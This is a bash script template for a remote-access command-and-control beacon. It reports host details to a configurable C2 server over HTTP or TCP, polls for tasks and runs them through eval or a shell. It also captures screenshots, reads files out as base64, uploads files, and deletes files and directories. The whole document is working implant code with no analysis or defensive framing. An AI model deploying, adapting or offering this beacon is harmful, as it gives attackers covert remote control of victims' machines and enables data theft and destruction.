#!/bin/bash

C2_URL="{{C2_URL}}"
BEACON_ID="{{BEACON_ID}}"
SLEEP={{SLEEP}}
JITTER={{JITTER}}
PROTO="{{PROTO}}"

get_internal_ip() {
    ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d/ -f1 2>/dev/null || \
    hostname -I 2>/dev/null | awk '{print $1}' || \
    echo "unknown"
}

check_admin() {
    [ "$(id -u)" -eq 0 ] && echo "true" || echo "false"
}

json_escape() {
    python3 -c "import sys,json; print(json.dumps(sys.stdin.read()))" 2>/dev/null <<< "$1" || \
    printf '"%s"' "$(echo "$1" | sed 's/\\/\\\\/g; s/"/\\"/g; s/\n/\\n/g')"
}

get_host_json() {
    local hostname=$(hostname 2>/dev/null || echo "unknown")
    local username=$(whoami 2>/dev/null || echo "unknown")
    local os_info="$(uname -s) $(uname -m)"
    local arch="amd64"
    [ "$(uname -m)" = "i686" ] || [ "$(uname -m)" = "i386" ] && arch="386"
    local pid=$$
    local process_name=$(basename "$0")
    local is_admin=$(check_admin)
    local internal_ip=$(get_internal_ip)

    echo "{\"beacon_id\":\"${BEACON_ID}\",\"hostname\":\"${hostname}\",\"username\":\"${username}\",\"domain\":\"\",\"os\":\"${os_info}\",\"arch\":\"${arch}\",\"pid\":${pid},\"process_name\":\"${process_name}\",\"is_admin\":${is_admin},\"internal_ip\":\"${internal_ip}\"}"
}

sleep_with_jitter() {
    local jitter_range=$((SLEEP * JITTER / 100))
    if [ "$jitter_range" -gt 0 ]; then
        local offset=$((RANDOM % (jitter_range * 2) - jitter_range))
        local actual_sleep=$((SLEEP + offset))
    else
        local actual_sleep=$SLEEP
    fi
    [ "$actual_sleep" -lt 1 ] && actual_sleep=1
    sleep "$actual_sleep"
}

capture_screenshot_sh() {
    local tmp="/tmp/.prts_ss_$$.png"
    local captured=0

    for tool in "import -window root $tmp" "scrot $tmp" "gnome-screenshot -f $tmp" "maim $tmp"; do
        local bin=$(echo "$tool" | awk '{print $1}')
        if command -v "$bin" >/dev/null 2>&1; then
            eval "$tool" >/dev/null 2>&1
            if [ -f "$tmp" ] && [ -s "$tmp" ]; then
                captured=1
                break
            fi
        fi
    done

    if [ "$captured" -eq 1 ]; then
        local b64=$(base64 -w0 "$tmp" 2>/dev/null || base64 "$tmp" 2>/dev/null)
        rm -f "$tmp"
        echo "SCREENSHOT:${b64}"
    else
        rm -f "$tmp" 2>/dev/null
        echo "Error: no screenshot tool available"
    fi
}

process_tasks() {
    local response="$1"
    local task_lines
    task_lines=$(python3 -c "
import sys, json
try:
    tasks = json.loads(sys.stdin.read())
    if isinstance(tasks, list):
        for t in tasks:
            tid = t.get('id','')
            cmd = t.get('command','')
            print(tid + '|||' + cmd)
except:
    pass
" <<< "$response" 2>/dev/null)

    [ -z "$task_lines" ] && return

    while IFS= read -r line; do
        [ -z "$line" ] && continue
        local task_id="${line%%|||*}"
        local cmd="${line#*|||}"

        if [ "$cmd" = "__EXIT__" ]; then
            $SEND_RESULT_FN "$task_id" "BEACON_TERMINATED"
            exit 0
        fi

        local cmd_lower
        cmd_lower=$(echo "$cmd" | tr '[:upper:]' '[:lower:]')

        local output
        if [ "$cmd_lower" = "pwd" ] || [ "$cmd_lower" = "cwd" ]; then
            output=$(pwd)
        elif echo "$cmd_lower" | grep -q "^cd "; then
            local target="${cmd#cd }"
            target="${target# }"
            if cd "$target" 2>/dev/null; then
                output="Changed directory to: $(pwd)"
            else
                output="Error: cannot cd to $target"
            fi
        elif [ "$cmd" = "__SCREENSHOT__" ]; then
            output=$(capture_screenshot_sh)
        elif echo "$cmd" | grep -q "^__FILELIST__ \|^__FILEREAD__ \|^__FILEUPLOAD__ \|^__MKDIR__ \|^__DELETE__ "; then
            output=$(python3 -c "
import os, json, sys, base64, shutil, time
cmd = sys.argv[1]
if cmd.startswith('__FILELIST__ '):
    d = cmd[13:].strip() or '.'
    if d == '__DRIVES__':
        d = '/'
    try:
        ap = os.path.abspath(d)
        items = []
        for n in os.listdir(ap):
            fp = os.path.join(ap, n)
            try:
                st = os.stat(fp)
                items.append({'name':n,'is_dir':os.path.isdir(fp),'size':st.st_size,'mod_time':time.strftime('%Y-%m-%dT%H:%M:%S',time.localtime(st.st_mtime))})
            except: pass
        print(json.dumps({'path':ap,'items':items}))
    except Exception as e:
        print(json.dumps({'error':str(e)}))
elif cmd.startswith('__FILEREAD__ '):
    fp = cmd[13:].strip()
    try:
        ap = os.path.abspath(fp)
        sz = os.path.getsize(ap)
        if sz > 50*1024*1024:
            print(json.dumps({'error':'file too large (>50MB)'}))
        else:
            with open(ap,'rb') as f: data=f.read()
            print(json.dumps({'path':ap,'size':sz,'base64':base64.b64encode(data).decode()}))
    except Exception as e:
        print(json.dumps({'error':str(e)}))
elif cmd.startswith('__FILEUPLOAD__ '):
    rest = cmd[15:].strip()
    idx = rest.find(' ')
    if idx < 0:
        print(json.dumps({'error':'usage error'}))
    else:
        fp, b64 = rest[:idx], rest[idx+1:]
        try:
            ap = os.path.abspath(fp)
            os.makedirs(os.path.dirname(ap), exist_ok=True)
            data = base64.b64decode(b64)
            with open(ap,'wb') as f: f.write(data)
            print(json.dumps({'status':'ok','path':ap,'size':len(data)}))
        except Exception as e:
            print(json.dumps({'error':str(e)}))
elif cmd.startswith('__MKDIR__ '):
    dp = cmd[10:].strip()
    try:
        ap = os.path.abspath(dp)
        os.makedirs(ap, exist_ok=True)
        print(json.dumps({'status':'ok','path':ap}))
    except Exception as e:
        print(json.dumps({'error':str(e)}))
elif cmd.startswith('__DELETE__ '):
    tp = cmd[10:].strip()
    try:
        ap = os.path.abspath(tp)
        if os.path.isdir(ap): shutil.rmtree(ap)
        else: os.remove(ap)
        print(json.dumps({'status':'ok','path':ap}))
    except Exception as e:
        print(json.dumps({'error':str(e)}))
" "$cmd" 2>&1)
        else
            output=$(eval "$cmd" 2>&1)
        fi

        $SEND_RESULT_FN "$task_id" "$output"
    done <<< "$task_lines"
}

# ==================== HTTP MODE ====================

http_register() {
    local json=$(get_host_json)
    curl -s -X POST "${C2_URL}/checkin" \
        -H "Content-Type: application/json" \
        -d "${json}" -m 10 >/dev/null 2>&1
}

http_send_result() {
    local task_id="$1"
    local output="$2"
    local escaped_output
    escaped_output=$(json_escape "$output")
    local json="{\"task_id\":\"${task_id}\",\"output\":${escaped_output}}"
    curl -s -X POST "${C2_URL}/checkin" \
        -H "Content-Type: application/json" \
        -d "${json}" -m 10 >/dev/null 2>&1
}

http_checkin() {
    local response
    response=$(curl -s \
        -H "X-Beacon-ID: ${BEACON_ID}" \
        -H "X-Beacon-OS: $(uname -s) $(uname -m)" \
        "${C2_URL}/checkin?id=${BEACON_ID}" -m 10 2>/dev/null)

    [ -z "$response" ] && return

    if echo "$response" | grep -q "^SLEEP "; then
        SLEEP=$(echo "$response" | awk '{print $2}')
        JITTER=$(echo "$response" | awk '{print $3}')
        return
    fi

    process_tasks "$response"
}

run_http() {
    SEND_RESULT_FN="http_send_result"
    http_register
    while true; do
        sleep_with_jitter
        http_checkin
    done
}

# ==================== TCP MODE ====================

# TCP mode uses python3 as a helper for socket framing
run_tcp() {
    SEND_RESULT_FN="tcp_send_result_stub"
    python3 -c "
import socket, struct, json, subprocess, os, sys, time, random, platform

C2_URL = '${C2_URL}'
BEACON_ID = '${BEACON_ID}'
SLEEP = ${SLEEP}
JITTER = ${JITTER}

def get_host_info():
    return $(get_host_json)

def tcp_write(sock, msg):
    data = json.dumps(msg).encode()
    sock.sendall(struct.pack('>I', len(data)) + data)

def tcp_read(sock):
    hdr = b''
    while len(hdr) < 4:
        c = sock.recv(4 - len(hdr))
        if not c: raise ConnectionError()
        hdr += c
    ln = struct.unpack('>I', hdr)[0]
    data = b''
    while len(data) < ln:
        c = sock.recv(min(ln - len(data), 65536))
        if not c: raise ConnectionError()
        data += c
    return json.loads(data)

def execute(cmd):
    cl = cmd.strip().lower()
    if cl in ('pwd','cwd'): return os.getcwd()
    if cl.startswith('cd '):
        try: os.chdir(cmd[3:].strip()); return 'Changed to: ' + os.getcwd()
        except Exception as e: return str(e)
    try:
        r = subprocess.run(['/bin/sh','-c',cmd], capture_output=True, text=True, timeout=120)
        return r.stdout + (('\\n'+r.stderr) if r.stderr else '')
    except: return 'Error'

def sleep_j():
    jr = SLEEP * (JITTER / 100.0)
    time.sleep(max(0.5, SLEEP + random.uniform(-jr, jr)))

parts = C2_URL.rsplit(':', 1)
host, port = parts[0], int(parts[1]) if len(parts) > 1 else 4444

while True:
    try:
        s = socket.create_connection((host, port), timeout=10)
        tcp_write(s, {'type':'register','data':get_host_info()})
        tcp_read(s)
        while True:
            sleep_j()
            tcp_write(s, {'type':'checkin'})
            resp = tcp_read(s)
            if resp.get('type') == 'tasks':
                for t in resp.get('data', []):
                    if t.get('command') == '__EXIT__':
                        tcp_write(s, {'type':'result','data':{'task_id':t['id'],'output':'TERMINATED'}})
                        tcp_read(s); s.close(); sys.exit(0)
                    out = execute(t.get('command',''))
                    tcp_write(s, {'type':'result','data':{'task_id':t['id'],'output':out}})
                    tcp_read(s)
            elif resp.get('type') == 'sleep':
                c = resp.get('data',{})
                if c.get('sleep',0) > 0: SLEEP = c['sleep']
                if c.get('jitter',-1) >= 0: JITTER = c['jitter']
    except: pass
    finally:
        try: s.close()
        except: pass
    sleep_j()
" 2>/dev/null
}

# ==================== MAIN ====================

if [ "$PROTO" = "tcp" ]; then
    run_tcp
else
    run_http
fi
